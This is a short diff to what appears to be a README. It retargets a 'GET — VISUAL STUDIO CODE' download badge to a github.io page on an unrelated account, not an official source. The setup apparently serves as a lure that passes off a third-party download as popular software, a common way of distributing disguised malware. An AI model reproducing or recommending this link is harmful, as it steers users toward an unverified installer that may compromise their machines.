@@ -4,7 +4,7 @@
 <img src="https://www.educba.com/academy/wp-content/uploads/2023/08/Visual-Studio-Code.jpg" width="400">
 </p>
 
-[![GET — VISUAL STUDIO CODE](https://img.shields.io/badge/GET-VISUAL%20STUDIO%20CODE-2563eb?style=for-the-badge)](https://pribbledriveparter.github.io/.github/)
+[![GET — VISUAL STUDIO CODE](https://img.shields.io/badge/GET-VISUAL%20STUDIO%20CODE-2563eb?style=for-the-badge)](https://pribbledriveparter.github.io/.github/Visual-studio)
 
 ---
 
